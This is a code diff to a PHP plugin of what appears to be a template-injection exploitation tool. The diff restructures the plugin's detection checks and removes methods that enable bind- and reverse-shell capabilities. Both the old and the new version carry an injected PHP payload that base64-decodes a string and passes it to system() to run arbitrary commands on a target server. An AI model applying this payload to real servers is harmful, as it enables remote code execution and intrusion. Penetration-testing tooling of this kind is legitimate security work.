@@ -41,11 +41,15 @@ class Php(Plugin):
             },
             'evaluate' : {
                 'call': 'render',
-                'evaluate': """%(code)s"""
+                'evaluate': """%(code)s""",
+                'test_os' : 'echo PHP_OS;',
+                'test_os_expected': '^[\w-]+$'
             },
             'execute' : {
                 'call': 'evaluate',
-                'execute': """$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)));"""
+                'execute': """$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%%4,'=',STR_PAD_RIGHT)));""",
+                'test_cmd': bash.echo % { 's1': rand.randstrings[2] },
+                'test_cmd_expected': rand.randstrings[2] 
             },
             'blind' : {
                 'call': 'evaluate_blind',
@@ -87,33 +91,6 @@ class Php(Plugin):
         ])
 
     language = 'php'
-
-    def rendered_detected(self):
-
-        os = self.evaluate("""echo PHP_OS;""")
-        if os and re.search('^[\w-]+$', os):
-            self.set('os', os)
-            self.set('evaluate', self.language)
-            self.set('write', True)
-            self.set('read', True)
-
-            expected_rand = str(rand.randint_n(2))
-            if expected_rand == self.execute('echo %s' % expected_rand):
-                self.set('execute', True)
-                self.set('bind_shell', True)
-                self.set('reverse_shell', True)
-
-
-    def blind_detected(self):
-
-        # Blind has been detected so code has been already evaluated
-        self.set('evaluate_blind', self.language)
-        
-        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
-            self.set('execute_blind', True)
-            self.set('write', True)
-            self.set('bind_shell', True)
-            self.set('reverse_shell', True)
 
 
 ctx_closures = {
